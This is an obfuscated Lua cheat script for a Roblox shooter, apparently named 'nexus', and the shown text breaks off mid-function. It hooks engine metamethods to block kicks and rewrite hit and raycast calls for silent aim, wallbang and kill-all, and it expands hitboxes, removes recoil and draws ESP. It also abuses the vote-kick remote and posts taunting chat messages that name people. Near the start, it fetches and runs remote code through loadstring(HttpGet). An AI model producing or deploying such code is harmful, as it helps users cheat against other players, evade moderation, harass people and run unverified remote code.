if getgenv().nexus then
	return
else
	getgenv().nexus = true
end 
repeat
	wait()
until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character

--//-------------- FUNCTION ----------------//*
local L_1_ = setmetatable({}, {
	__index = function(L_102_arg1, L_103_arg2)
		local L_104_ = game:GetService(L_103_arg2);
		if L_104_ then
			L_102_arg1[L_103_arg2] = L_104_; 
			return L_104_;
		end
	end,
})
if hookmetamethod and typeof(hookmetamethod) == 'function' then
	local L_105_
	L_105_ = hookmetamethod(game, "__namecall", function(L_106_arg1, ...)
		if getnamecallmethod() == "Kick" then
			return
		end
		return L_105_(L_106_arg1, ...)
	end)
end

--//-------------- SERVICES ----------------//*
local L_2_ = L_1_.Players
local L_3_ = L_1_.Workspace
local L_4_ = L_1_.ReplicatedStorage
local L_5_ = L_1_.RunService
local L_6_ = L_1_.UserInputService
local L_7_ = L_2_.LocalPlayer
local L_8_ = L_4_.Game.GameState
local L_9_ = L_4_.ClientModules
local L_10_ = require(L_9_.CameraAccelerator)
local L_11_ = L_3_.CurrentCamera
local L_12_ = game:GetService('VirtualInputManager')
local L_13_ = L_7_:GetMouse()
local L_14_ = Drawing.new("Circle")
local L_15_ = L_7_.PlayerScripts
local L_16_ = game:GetService("UserInputService")
local L_17_ = L_15_.WeaponryFramework
local L_18_ = require(L_9_.InputConfigs)
local L_19_ = require(L_9_.CharacterStateConfigs)
local L_20_ = L_7_.Name
local L_21_ = game:GetService("HttpService")
local L_22_ = game:GetService("RunService")
local L_23_ = Drawing.new("Circle")
local L_24_ = L_7_.Character
local L_25_ = game:GetService("TeleportService")
local L_26_ = "FLORENCE/SETTINGS/"..game.PlaceId..'.txt'
local L_27_ = game.GameId
local L_28_ = Instance.new("BindableEvent")
local L_29_ = L_28_.Event:Connect(function()
end)

spawn(function()
	while wait() do
		if getgenv().Disconnect == true then
			wait(1)
			L_29_:Disconnect()
			getgenv().Disconnect = false
			game.Players.LocalPlayer.Character.Humanoid.Health = 0
			return
		else  
			L_28_:Fire()
		end
	end  
end)  

local L_30_ = {
	"Torso",
	"Head",
	"Random"
}
local L_31_ = {
	" | nexus takeover",
	" | nexus gaming chair",
	" | Panda is a bad moderator",
	" | domshoe is a W",
	" | domshoe supports nexus",
	" | Domshoe uses Nexus's script",
	"steam is a furry"
}
local L_32_ = {}

local L_33_ = {}
do
	L_33_.Folder = "FLORENCE"
	L_33_.Ignore = {}
	L_33_.Parser = {
		Toggle = {
			Save = function(L_107_arg1, L_108_arg2) 
				return {
					type = "Toggle",
					idx = L_107_arg1,
					value = L_108_arg2.Value
				} 
			end,
			Load = function(L_109_arg1, L_110_arg2)
				if L_33_.Options[L_109_arg1] then 
					L_33_.Options[L_109_arg1]:SetValue(L_110_arg2.value)
				end
			end,
		},
		Slider = {
			Save = function(L_111_arg1, L_112_arg2)
				return {
					type = "Slider",
					idx = L_111_arg1,
					value = tostring(L_112_arg2.Value)
				}
			end,
			Load = function(L_113_arg1, L_114_arg2)
				if L_33_.Options[L_113_arg1] then 
					L_33_.Options[L_113_arg1]:SetValue(L_114_arg2.value)
				end
			end,
		},
		Dropdown = {
			Save = function(L_115_arg1, L_116_arg2)
				return {
					type = "Dropdown",
					idx = L_115_arg1,
					value = L_116_arg2.Value,
					mutli = L_116_arg2.Multi
				}
			end,
			Load = function(L_117_arg1, L_118_arg2)
				if L_33_.Options[L_117_arg1] then 
					L_33_.Options[L_117_arg1]:SetValue(L_118_arg2.value)
				end
			end,
		},
		Colorpicker = {
			Save = function(L_119_arg1, L_120_arg2)
				return {
					type = "Colorpicker",
					idx = L_119_arg1,
					value = L_120_arg2.Value:ToHex(),
					transparency = L_120_arg2.Transparency
				}
			end,
			Load = function(L_121_arg1, L_122_arg2)
				if L_33_.Options[L_121_arg1] then 
					L_33_.Options[L_121_arg1]:SetValueRGB(Color3.fromHex(L_122_arg2.value), L_122_arg2.transparency)
				end
			end,
		},
		Keybind = {
			Save = function(L_123_arg1, L_124_arg2)
				return {
					type = "Keybind",
					idx = L_123_arg1,
					mode = L_124_arg2.Mode,
					key = L_124_arg2.Value
				}
			end,
			Load = function(L_125_arg1, L_126_arg2)
				if L_33_.Options[L_125_arg1] then 
					L_33_.Options[L_125_arg1]:SetValue(L_126_arg2.key, L_126_arg2.mode)
				end
			end,
		},

		Input = {
			Save = function(L_127_arg1, L_128_arg2)
				return {
					type = "Input",
					idx = L_127_arg1,
					text = L_128_arg2.Value
				}
			end,
			Load = function(L_129_arg1, L_130_arg2)
				if L_33_.Options[L_129_arg1] and type(L_130_arg2.text) == "string" then
					L_33_.Options[L_129_arg1]:SetValue(L_130_arg2.text)
				end
			end,
		},
	}

	function L_33_:SetIgnoreIndexes(L_131_arg1)
		for L_132_forvar1, L_133_forvar2 in next, L_131_arg1 do
			self.Ignore[L_133_forvar2] = true
		end
	end

	function L_33_:SetFolder(L_134_arg1)
		self.Folder = L_134_arg1;
		self:BuildFolderTree()
	end

	function L_33_:Save(L_135_arg1)
		if (not L_135_arg1) then
			return false, "no config file is selected"
		end

		local L_136_ = self.Folder.."/settings/"..L_135_arg1..".json"

		local L_137_ = {
			objects = {}
		}

		for L_140_forvar1, L_141_forvar2 in next, L_33_.Options do
			if not self.Parser[L_141_forvar2.Type] then
				continue
			end
			if self.Ignore[L_140_forvar1] then
				continue
			end

			table.insert(L_137_.objects, self.Parser[L_141_forvar2.Type].Save(L_140_forvar1, L_141_forvar2))
		end	

		local L_138_, L_139_ = pcall(L_21_.JSONEncode, L_21_, L_137_)
		if not L_138_ then
			return false, "failed to encode data"
		end

		writefile(L_136_, L_139_)
		return true
	end

	function L_33_:Load(L_142_arg1)
		if (not L_142_arg1) then
			return false, "no config file is selected"
		end

		local L_143_ = self.Folder.."/settings/"..L_142_arg1..".json"
		if not isfile(L_143_) then
			return false, "invalid file"
		end

		local L_144_, L_145_ = pcall(L_21_.JSONDecode, L_21_, readfile(L_143_))
		if not L_144_ then
			return false, "decode error"
		end

		for L_146_forvar1, L_147_forvar2 in next, L_145_.objects do
			if self.Parser[L_147_forvar2.type] then
				task.spawn(function()
					self.Parser[L_147_forvar2.type].Load(L_147_forvar2.idx, L_147_forvar2)
				end)
			end
		end

		return true
	end

	function L_33_:IgnoreThemeSettings()
		self:SetIgnoreIndexes({ 
			"InterfaceTheme",
			"AcrylicToggle",
			"TransparentToggle",
			"MenuKeybind"
		})
	end

	function L_33_:BuildFolderTree()
		local L_148_ = {
			self.Folder,
			self.Folder.."/settings"
		}

		for L_149_forvar1 = 1, #L_148_ do
			local L_150_ = L_148_[L_149_forvar1]
			if not isfolder(L_150_) then
				makefolder(L_150_)
			end
		end
	end

	function L_33_:SetLibrary(L_151_arg1)
		self.Library = L_151_arg1
		self.Options = L_151_arg1.Options
	end

	L_33_:BuildFolderTree()
end

local L_34_ = loadstring(game:HttpGet("https://github.com/13B8B/nexus/releases/download/nexus/nexus.txt"))()
local L_35_ = L_34_.Options
L_33_:SetLibrary(L_34_)
--[[
   premium = true
]]

local L_36_ = L_34_:CreateWindow({
	Title = "nexus ",
	"",
	SubTitle = "",
	TabWidth = 160,
	Size = UDim2.fromOffset(580, 460),
	Acrylic = true,
	Theme = "Dark",
})

local L_37_ = {
	Main = L_36_:AddTab({
		Title = "Main",
		Icon = "rbxassetid://10723424505"
	}),
	Misc = L_36_:AddTab({
		Title = "Misc",
		Icon = "rbxassetid://10709818534"
	}),
	Visual = L_36_:AddTab({
		Title = "Visual",
		Icon = "rbxassetid://10723346959"
	}),
	Player = L_36_:AddTab({
		Title = "Player",
		Icon = "rbxassetid://10747373176"
	}),
	Server = L_36_:AddTab({
		Title = "Server",
		Icon = "rbxassetid://10734949856"
	}),
	Settings = L_36_:AddTab({
		Title = "Settings",
		Icon = "rbxassetid://10734950020"
	}),
	Premium = premium == "premium" and L_36_:AddTab({
		Title = "Premium",
		Icon = "rbxassetid://10709819149"
	}),

}
--Options.SniperAim.Value 200 Options.SilentAim.Value
local L_38_ = L_37_.Main:AddToggle("SilentAim", {
	Title = "Silent Aim",
	Default = false,
	Callback = function(L_152_arg1)
	end
})
local L_39_ = L_37_.Main:AddToggle("ShowFOV", {
	Title = "Show FOV",
	Default = false,
	Callback = function(L_153_arg1)
	end
})
local L_40_ = L_37_.Main:AddSlider("Radius", {
	Title = "Fov Radius",
	Default = 0,
	Min = 50,
	Max = 250,
	Rounding = 1,
	Callback = function(L_154_arg1)
	end
})  
local L_41_ = L_37_.Main:AddDropdown("Hitpart", {
	Title = "Hitpart",
	Values = {
		"Head",
		"Torso",
		"Random"
	}, 
	Multi = false,
	Default = "",
	Callback = function(L_155_arg1)

	end
})
local L_42_ = L_37_.Misc:AddToggle("AutoReload", {
	Title = "Infinite Ammo",
	Default = false,
	Callback = function(L_156_arg1)
		if L_156_arg1 then 
			repeat
				task.wait(.1)  
				local L_157_ = L_7_.Character
				if L_157_ and L_157_:FindFirstChild("HumanoidRootPart") then
					for L_158_forvar1, L_159_forvar2 in pairs(L_157_:GetChildren()) do
						if L_159_forvar2:IsA("Tool") then
							module:reloadWeapon()
						end
					end
				end
			until not L_35_.AutoReload.Value or not L_29_.Connected
		end
	end
})

local L_43_ = L_37_.Main:AddToggle("SniperAim", {
	Title = "Sniper Wallbang + [ Silent Aim ]",
	Default = false,
	Callback = function(L_160_arg1)
	end
})
local L_44_ = L_37_.Main:AddToggle("KillAll", {
	Title = "Kill All",
	Default = false,
	Callback = function(L_161_arg1)
	end
})

local L_45_ = game:GetService("Players")
local L_46_ = game:GetService("RunService")
local L_47_ = game:GetService("ReplicatedStorage")

-- lph macro
if not LPH_OBFUSCATED then
	LPH_JIT = function(...)
		return ...
	end

	LPH_CRASH = function(...)
		return ...
	end

	LPH_NO_VIRTUALIZE = function(...)
		return ...
	end
end

-- variables
local L_48_ = L_45_.LocalPlayer

local L_49_ = os.time()
local L_50_ = false

local L_51_ = L_47_.Remotes
local L_52_ = L_47_.Weapons

local L_53_ = L_51_.HitHandler
local L_54_ = L_51_.WeaponHandler
local L_55_ = L_51_.VotekickPlayerInit

-- functions
local L_56_ = LPH_NO_VIRTUALIZE(function(L_162_arg1:Player)
	if L_162_arg1 and L_162_arg1.Character then
		if L_162_arg1.Character:FindFirstChild("Humanoid") and L_162_arg1.Character:FindFirstChild("HumanoidRootPart") and not L_162_arg1.Character:FindFirstChild("ForceField") then
			if (L_162_arg1.Character.Humanoid.Health >= 1) then
				return true
			end
		elseif L_162_arg1.Character:FindFirstChild("ForceField") then
			L_12_:SendKeyEvent(true, "W", false, game)
			task.wait(0.003)
			L_12_:SendKeyEvent(false, "W", false, game)

		end  
	end  

	return false
end)

local L_57_ = LPH_NO_VIRTUALIZE(function()
	local L_163_
	local L_164_ = math.huge

	for L_165_forvar1, L_166_forvar2 in next, L_45_:GetPlayers() do
		if (L_166_forvar2 ~= L_48_) and (L_166_forvar2.Team ~= L_48_.Team or L_166_forvar2.Team == nil) and (L_56_(L_166_forvar2) and L_56_(L_48_)) then
			local L_167_ = L_48_:DistanceFromCharacter(L_166_forvar2.Character.HumanoidRootPart.Position)

			if L_167_ < L_164_ then
				L_163_ = L_166_forvar2
				L_164_ = L_167_
			end
		end
	end

	return L_163_
end)

local L_58_ = LPH_JIT(function(L_168_arg1:Player)
	if L_56_(L_48_) and L_56_(L_168_arg1) then
		local L_169_ = L_168_arg1.HitboxVal.Value
		local L_170_ = L_48_.Character:FindFirstChildWhichIsA("Tool")
		local L_171_ = L_48_:DistanceFromCharacter(L_168_arg1.Character.HumanoidRootPart.Position)

		if ((os.time() - L_49_) < 0.1) then
			return
		end

		if L_170_ and L_169_ and L_170_.Name == "Knife" then
			local L_172_ = require(L_52_[L_170_.Name:lower()][L_170_.Name:lower()])

			L_54_:FireServer(1, { 
				["RunTimeValue"] = os.time(), 
				["IsFirstPerson"] = true, 
				["MeleeMode"] = 2, 
				["WeaponProfile"] = {
					["TriggerDisconnected"] = true,
					["WeaponStats"] = L_172_,
					["Reloading"] = false,
					["Extra"] = true,
					["WeaponName"] = L_170_.Name,
					["ToolInstance"] = L_170_,
					["CanShoot"] = true,
					["PauseDebounce"] = {},
					["BodyAttach"] = L_170_.BodyAttach
				},
				["InitialPos"] = L_170_.BodyAttach.Position,
				["ShotTick"] = os.time()
			})

			L_54_:FireServer(2, os.time(), {
				["RayDir"] = CFrame.new(L_170_.BodyAttach.Position, L_169_.HitboxMelee.Position).LookVector,
				["BulletTick"] = os.time()
			})

			L_53_:InvokeServer({
				["HitPlr"] = L_168_arg1,
				["isChar"] = true,
				["Distance"] = L_171_,
				["ShotTick"] = os.time(),
				["isHitbox"] = true,
				["HitObj"] = L_169_.HitboxMelee,
				["HitNorm"] = CFrame.new(L_170_.BodyAttach.Position, L_169_.HitboxMelee.Position).LookVector,
				["BulletTick"] = os.time(),
				["HitChar"] = L_168_arg1.Character,
				["HitPos"] = L_169_.HitboxMelee.Position
			})
		end
	end
end)

L_46_.RenderStepped:Connect(function()

	if ((os.time() - L_49_) < 0) then
		L_50_ = false
	end

	if (not L_50_) and L_35_.KillAll.Value and L_29_.Connected then
		local L_173_ = L_57_()

		if (L_173_ and L_56_(L_173_)) then
			L_50_ = true

			repeat
				task.wait()
				if L_56_(L_48_) then
					L_48_.Character.HumanoidRootPart.CFrame = CFrame.new(L_173_.Character.HumanoidRootPart.Position - (Vector3.new(0, 0, 3)))
					L_58_(L_173_)
					local L_174_, L_175_ = pcall(function()
						local L_176_ = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Knife")
						game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(L_176_)
					end)
				end
			until L_173_.Character.Humanoid.Health <= 0 or (not L_56_(L_173_) or not L_56_(L_48_))

			L_50_ = false
		end  
	end
end)
local L_59_ = L_37_.Main:AddToggle("AntiKick", {
	Title = "Anti Vote-Kick",
	Default = false,
	Callback = function(L_177_arg1)
		if L_177_arg1 then
			repeat
				game:GetService("Players").LocalPlayer.PlayerGui.MainUI.VerticalInterface.Visible = false
				task.wait(.1)
				if #L_45_:GetPlayers() > 1 then
					local L_178_ = L_45_:GetPlayers()[2]
					L_55_:FireServer(L_178_)
				end
			until not L_35_.AntiKick.Value or not L_29_.Connected
			game:GetService("Players").LocalPlayer.PlayerGui.MainUI.VerticalInterface.Visible = true
		end
	end
})

local L_60_ = L_37_.Misc:AddToggle("Norecoil", {
	Title = "No Recoil",
	Default = false,
	Callback = function(L_179_arg1)
	end  
})
local function L_61_func()
	for L_180_forvar1 = #L_31_, 2, -1 do
		local L_181_ = math.random(1, L_180_forvar1)
		L_31_[L_180_forvar1], L_31_[L_181_] = L_31_[L_181_], L_31_[L_180_forvar1]
	end

	return L_31_[1]
end

local L_62_ = {}

local L_63_ = L_37_.Misc:AddToggle("AutoToxic", {
	Title = "Auto Toxic",
	Default = false,
	Callback = function(L_182_arg1)
		if L_182_arg1 then
			repeat
				task.wait()
				for L_183_forvar1, L_184_forvar2 in ipairs(game:GetService("Players").LocalPlayer.PlayerGui.MainUI.KillFeed:GetChildren()) do
					if L_184_forvar2:IsA("Frame") and L_184_forvar2.Eliminator.PlayerName.Text == L_20_ then
						local L_185_ = L_184_forvar2.Eliminated.PlayerName.Text
						if not table.find(L_62_, L_185_) then
							local L_186_ = L_61_func()
							if L_186_ ~= "steam is a furry" then
								L_186_ = L_185_..L_186_
							end
							print("You killed "..L_185_)
							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(L_186_, "All")
							table.insert(L_62_, L_185_)
							spawn(function()
								wait(20)
								table.remove(L_62_, table.find(L_62_, L_185_))
							end)
						end
					end
				end
			until not L_35_.AutoToxic.Value or not L_29_.Connected
		end
	end
})
local L_64_ = L_37_.Visual:AddToggle("EnemyChams", {
	Title = "Enemy Chams",
	Default = false,
	Callback = function(L_187_arg1)  
	end
})
local L_65_ = L_37_.Visual:AddToggle("TeamChams", {
	Title = "Team Chams",
	Default = false,
	Callback = function(L_188_arg1)
	end
})
local L_66_ = L_37_.Visual:AddToggle("Rainbow", {
	Title = "Rainbow Chams",
	Default = false,
	Callback = function(L_189_arg1)
	end
})

task.spawn(function()
	while task.wait() do 
		if not L_29_.Connected then 
			for L_190_forvar1, L_191_forvar2 in next, game:GetService('Players'):GetPlayers() do
				pcall(function()
					L_191_forvar2.Character.Highlight:Destroy()
				end)
			end 
			return
		end 
		if L_35_.EnemyChams.Value or L_35_.TeamChams.Value then
			local L_192_, L_193_ = pcall(function()
				local L_194_ = game:GetService("ReplicatedStorage")
				local L_195_ = game:GetService("Players")
				local L_196_ = L_195_.LocalPlayer

				local L_197_ = {}  

				local function L_198_func(L_199_arg1)
					if L_197_[L_199_arg1] ~= nil then
						return L_197_[L_199_arg1]  
					end

					local L_200_ = game:GetService("Players").LocalPlayer.Team
					if L_200_ then
						local L_201_ = L_199_arg1 ~= game:GetService("Players").LocalPlayer and L_199_arg1.Team ~= L_200_
						L_197_[L_199_arg1] = L_201_  
						return L_201_
					end
					return false
				end

				function CreateHighlight()
					for L_202_forvar1, L_203_forvar2 in pairs(L_195_:GetChildren()) do
						if L_203_forvar2 ~= L_196_ and L_203_forvar2.Character and not L_203_forvar2.Character:FindFirstChild("Highlight") then
							local L_204_ = Instance.new("Highlight", L_203_forvar2.Character)
							if L_198_func(L_203_forvar2) == true then
								L_203_forvar2.Character.Highlight.Enabled = false
							elseif L_198_func(L_203_forvar2) == false then
								L_203_forvar2.Character.Highlight.Enabled = false
							end
						end
					end
				end

				function UpdateHighlights()
					for L_205_forvar1, L_206_forvar2 in pairs(L_195_:GetChildren()) do
						if L_206_forvar2 ~= L_196_ and L_206_forvar2.Character and L_206_forvar2.Character:FindFirstChild("Highlight") then
							local L_207_ = L_206_forvar2.Character:FindFirstChild("Highlight")
							if game:GetService("ReplicatedStorage").Game.SecondaryStatus.Value == "Free For All" and (L_35_.TeamChams.Value or L_35_.EnemyChams.Value) then
								L_206_forvar2.Character.Highlight.Enabled = true
								L_207_.FillColor = Color3.fromRGB(255, 0, 0)
							elseif L_198_func(L_206_forvar2) == true and L_35_.EnemyChams.Value == true then
								L_206_forvar2.Character.Highlight.Enabled = true
								L_207_.FillColor = Color3.fromRGB(255, 0, 0)
							elseif L_198_func(L_206_forvar2) == true and L_35_.EnemyChams.Value == false then
								L_206_forvar2.Character.Highlight.Enabled = false 
							elseif L_198_func(L_206_forvar2) == false and L_35_.TeamChams.Value == true then
								L_206_forvar2.Character.Highlight.Enabled = true
								L_207_.FillColor = Color3.fromRGB(255, 255, 255)
							elseif L_198_func(L_206_forvar2) == false and L_35_.TeamChams.Value == false then
								L_206_forvar2.Character.Highlight.Enabled = false
							end
							if L_35_.Rainbow.Value then 
								L_207_.FillColor = Color3.fromHSV(tick() % 5 / 5, 1, 1)
							end
						end  
					end
				end  

				CreateHighlight()
				UpdateHighlights()
			end)
		else  
			for L_208_forvar1, L_209_forvar2 in next, game:GetService('Players'):GetPlayers() do
				if L_209_forvar2.Name ~= game:GetService('Players').LocalPlayer.Name and (L_35_.TeamChams.Value == false or L_209_forvar2.TeamColor ~= game:GetService('Players').LocalPlayer.TeamColor) then
					pcall(function()
						L_209_forvar2.Character.Highlight:Destroy()
					end)
				end
			end
			repeat
				wait()
			until L_35_.EnemyChams.Value == true or L_35_.TeamChams.Value == true 

		end 
	end
end)


local L_67_ = L_37_.Main:AddToggle("ExpandHitbox", {
	Title = "Expand Hitbox",
	Default = false,
	Callback = function(L_210_arg1)
		if L_210_arg1 then 
			repeat
				task.wait()  
				for L_211_forvar1, L_212_forvar2 in pairs (game:GetService("Workspace").Hitboxes:GetChildren()) do
					if L_212_forvar2.Name ~= tostring(game:GetService("Players").LocalPlayer.UserId) and L_212_forvar2:FindFirstChild("HitboxHead") then
						L_212_forvar2.HitboxHead.Size = Vector3.new(30, 30, 30)
					end
				end     
			until not L_35_.ExpandHitbox.Value or not L_29_.Connected
		end
	end
})

local L_68_ = L_37_.Visual:AddToggle("WeaponCham", {
	Title = "Weapon Chams",
	Default = false,
	Callback = function(L_213_arg1)
		if L_213_arg1 then 
			repeat
				task.wait()  
				local L_214_ = L_7_.Character
				if L_214_ and L_214_:FindFirstChild("HumanoidRootPart") then
					for L_215_forvar1, L_216_forvar2 in pairs(L_214_:GetChildren()) do
						if L_216_forvar2:IsA("Tool") then
							for L_217_forvar1, L_218_forvar2 in pairs(L_216_forvar2:GetDescendants()) do
								if L_218_forvar2:IsA("MeshPart") then
									L_218_forvar2.Material = Enum.Material.ForceField                            
								end
							end
						end  
					end
				end
			until not L_35_.WeaponCham.Value or not L_29_.Connected
			if L_24_ and L_24_:FindFirstChild("HumanoidRootPart") then  
				for L_219_forvar1, L_220_forvar2 in pairs(L_24_:GetChildren()) do
					if L_220_forvar2:IsA("Tool") then
						for L_221_forvar1, L_222_forvar2 in pairs(L_220_forvar2:GetDescendants()) do
							if L_222_forvar2:IsA("MeshPart") then
								L_222_forvar2.Material = Enum.Material.SmoothPlastic                        
							end
						end  
					end  
				end
			end
		end
	end
})

local L_69_ = L_37_.Visual:AddToggle("WeaponRainbow", {
	Title = "Rainbow Weapon",
	Default = false,
	Callback = function(L_223_arg1)
		if L_223_arg1 then 
			repeat
				task.wait()  
				local L_224_ = L_7_.Character
				if L_224_ and L_224_:FindFirstChild("HumanoidRootPart") then
					for L_225_forvar1, L_226_forvar2 in pairs(L_224_:GetChildren()) do
						if L_226_forvar2:IsA("Tool") then
							for L_227_forvar1, L_228_forvar2 in pairs(L_226_forvar2:GetDescendants()) do
								if L_228_forvar2:IsA("BasePart") and L_228_forvar2.Name ~= "Handle" then
									L_228_forvar2.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
								end
							end
						end
					end
				end
			until not L_35_.WeaponRainbow.Value or not L_29_.Connected  
		end
	end
})

do 
	L_23_.Thickness = 1
	L_23_.Filled = false
	L_23_.Transparency = 1
	L_23_.Color = Color3.new(207, 95, 64)
	L_23_.Visible = L_35_.ShowFOV.Value;
	L_23_.Radius = L_35_.Radius.Value
end;
function CreateVector2(L_229_arg1) 
	return Vector2.new(L_229_arg1.X, L_229_arg1.Y)
end;
function GetDirection(L_230_arg1, L_231_arg2)
	return (L_231_arg2 - L_230_arg1).Unit * 1000
end;
function GetHitPart(L_232_arg1) 
	if L_232_arg1 then
		local L_233_ = (L_35_.Hitpart.Value == "Random" and L_30_[math.random(1, 2)]) or (L_35_.Hitpart.Value or "Torso")
		local L_234_ = L_232_arg1:FindFirstChild(L_233_)

		if L_234_ then
			return L_234_
		end
	end
end;
function GetFramework()
	for L_235_forvar1, L_236_forvar2 in pairs(L_7_.PlayerScripts:GetChildren()) do
		local L_237_, L_238_ = pcall(function()
			return getsenv(L_236_forvar2)
		end)
		if L_237_ and L_238_.InspectWeapon then
			return L_238_
		end
	end;
	return nil
end;
function IsPartVisible(L_239_arg1, L_240_arg2) 
	L_240_arg2 = L_240_arg2 or {}
	local L_241_ = L_11_.GetPartsObscuringTarget(L_11_, {
		L_239_arg1.Position
	}, {
		L_11_,
		L_7_.Character,
		unpack(L_240_arg2)
	})
	return #L_241_ <= 10
end;
function GetClosestPlayer(L_242_arg1, L_243_arg2) 
	L_242_arg1 = L_242_arg1 or math.huge;    
	for L_244_forvar1, L_245_forvar2 in next, L_45_.GetPlayers(L_45_) do 
		if L_245_forvar2 == L_7_ then 
			continue
		end;
		if L_8_.Value == "Team Deathmatch" and workspace[L_245_forvar2.Name].Head.NameTag.Enabled == true then
			warn("Skipping team·mate")
			continue
		end;
		if not L_245_forvar2.Character then
			continue
		end;
		local L_246_ = L_245_forvar2.Character:FindFirstChild("HumanoidRootPart")

		if not L_246_ then
			continue
		end;
		local L_247_, L_248_ = L_11_.WorldToScreenPoint(L_11_, L_246_.Position) 
		if L_248_ then
			if not IsPartVisible(L_246_, L_243_arg2) then
				continue
			end;
			local L_249_, L_250_
			pcall(function()
				if workspace[L_245_forvar2.Name].Head.NameTag.Enabled == false then
					local L_251_ = (CreateVector2(L_13_) - CreateVector2(L_247_)).Magnitude;
					if L_251_ <= L_242_arg1 then
						L_242_arg1 = L_251_;
						closestPlayer = L_245_forvar2;
						closestPlayerChar = L_245_forvar2.Character       
					end
				end
			end)  
		end
	end;
	return closestPlayer, closestPlayerChar
end;

local L_70_ = GetFramework().CheckIsToolValid;
local L_71_ = {
	["Raycast"] = function(L_252_arg1, ...)
		local L_253_ = {
			...
		}
		if L_35_.SilentAim.Value and L_252_arg1 == L_252_arg1 then
			local L_254_ = debug.traceback() 
			if string.find(L_254_, "FireWeapon") then
				local L_255_ = L_253_[3].FilterDescendantsInstances; 
				local L_256_, L_257_ = GetClosestPlayer(200, L_255_)
				if L_256_ and L_257_ then
					local L_258_ = GetHitPart(L_257_)
					if L_258_ then
						L_253_[2] = GetDirection(L_253_[1], L_258_.Position)
						local L_259_ = game:GetService("Players"):GetPlayers()
						local L_260_ = game.Players.LocalPlayer
						for L_261_forvar1, L_262_forvar2 in ipairs(L_259_) do
							return L_252_arg1.Raycast(L_252_arg1, unpack(L_253_))
						end
					end 
				end  
			end
		end;
		return L_252_arg1.Raycast(L_252_arg1, ...)
	end;		 
}
local L_72_;
L_72_ = hookmetamethod(game, "__namecall", function(L_263_arg1, ...)
	local L_264_ = getnamecallmethod()
	local L_265_ = checkcaller()
	local L_266_ = L_71_[L_264_]
	local L_267_;
	if L_266_ then
		if typeof(L_266_) == "function" then
			L_267_ = {
				checkcaller = false;
				callback = L_266_
			}
		else
			L_267_ = L_266_[L_263_arg1.Name]
		end
	end;
	if (L_267_ and L_267_.checkcaller == L_265_) then
		local L_268_, L_269_ = pcall(L_267_.callback, L_263_arg1, ...)
		if not L_268_ then
			warn("Error", L_269_)
		end;
		return L_269_
	end;
	return L_72_(L_263_arg1, ...)
end)

local L_73_ = L_10_.accelerate
L_10_.accelerate = function(...)
	if L_35_.Norecoil.Value then
		return nil
	end
	return L_73_(...)
end

game.Loaded.Connect(L_46_.RenderStepped, function()
	L_23_.Radius = L_35_.Radius.Value;
	L_23_.Visible = L_35_.ShowFOV.Value;
	L_23_.Position = L_16_.GetMouseLocation(L_16_)
end)

local function L_74_func(L_270_arg1)
	local L_271_, L_272_ = L_11_:WorldToScreenPoint(L_270_arg1.Position)
	return L_272_, Vector2.new(L_271_.X, L_271_.Y)
end

local function L_75_func(L_273_arg1)
	local L_274_ = L_273_arg1.Character
	if not L_274_ or L_274_:FindFirstChildOfClass("ForceField") then
		return nil, nil
	end

	local L_275_ = game.workspace.Hitboxes:FindFirstChild(tostring(L_273_arg1.UserId))
	if not L_275_ or L_274_.Humanoid.Health <= 0 then
		return nil, nil
	end

	local L_276_ = {
		L_275_.HitboxHead,
		L_275_.HitboxBody,
		L_275_.HitboxLeg
	}
	local L_277_, L_278_ = nil, math.huge

	for L_279_forvar1, L_280_forvar2 in ipairs(L_276_) do
		local L_281_, L_282_ = L_74_func(L_280_forvar2)
		if L_281_ then
			local L_283_ = (L_282_ - Vector2.new(L_13_.X, L_13_.Y)).Magnitude
			if L_283_ < L_278_ then
				L_277_ = L_280_forvar2
				L_278_ = L_283_
			end
		end
	end

	return L_277_, L_278_
end

local function L_76_func()
	local L_284_, L_285_, L_286_ = nil, math.huge, nil

	for L_287_forvar1, L_288_forvar2 in ipairs(L_45_:GetPlayers()) do
		if L_288_forvar2 ~= L_7_ and L_288_forvar2.Character then
			local L_289_, L_290_ = L_75_func(L_288_forvar2)
			if L_289_ and L_290_ and L_290_ < L_285_ then
				L_284_ = L_289_
				L_285_ = L_290_
				L_286_ = L_288_forvar2
			end
		end
	end

	return L_284_, L_286_
end

local L_77_, L_78_

game:GetService("RunService").Stepped:Connect(function()
	L_77_, L_78_ = L_76_func()
end)

local L_79_
L_79_ = hookmetamethod(game, "__namecall", function(L_291_arg1, ...)
	local L_292_ = {
		...
	}
	local L_293_ = getnamecallmethod()

	if L_293_ == "InvokeServer" and L_291_arg1.Name == "HitHandler" and L_35_.SniperAim.Value then
		if L_292_[1]["HitPos"] and L_77_ then
			L_292_[1]["HitPos"] = L_77_.Position
			L_292_[1]["HitObj"] = L_77_
		end
	elseif L_293_ == "FireServer" and L_291_arg1.Name == "WeaponHandler" and L_35_.SniperAim.Value then
		if L_292_[3] and L_292_[3]["RayDir"] and L_77_ then
			L_292_[3]["RayDir"] = (L_77_.Position - L_7_.Character.Head.Position).Unit
		end
	end

	return L_79_(L_291_arg1, unpack(L_292_))
end)


local L_80_ = L_37_.Settings:AddToggle("Settings", {
	Title = "Save Settings",
	Default = false,
	Callback = function(L_294_arg1)
		if L_294_arg1 then 
			repeat
				task.wait(10)  
				L_33_:Save(L_27_)
			until not L_35_.Settings.Value or not L_29_.Connected
		end
	end
})

L_37_.Settings:AddButton({
	Title = "Delete Setting Config",
	Callback = function()
		delfile("FLORENCE/settings/"..game.GameId..".json")
	end  
})  

local L_81_ = L_37_.Player:AddToggle("SpeedMulti", {
	Title = "Walk Speed",
	Default = false,
	Callback = function(L_295_arg1)
		if L_295_arg1 then 
			repeat
				task.wait()  
				rawset(L_19_, "SpeedMulti", L_35_.WalkSpeed.Value);
			until not L_35_.SpeedMulti.Value or not L_29_.Connected
			rawset(L_19_, "SpeedMulti", 1);
		end
	end
})
local L_82_ = L_37_.Player:AddSlider("WalkSpeed", {
	Title = "Walk Multi Speed",
	Default = 1,
	Min = 1,
	Max = 10,
	Rounding = 1,
	Callback = function(L_296_arg1)
	end
})
local L_83_ = L_37_.Player:AddToggle("Jump", {
	Title = "Jump Speed",
	Default = false,
	Callback = function(L_297_arg1)
		if L_297_arg1 then 
			repeat
				task.wait()  
				rawset(L_19_, "JumpMulti", L_35_.JumpPower.Value);
			until not L_35_.Jump.Value or not L_29_.Connected
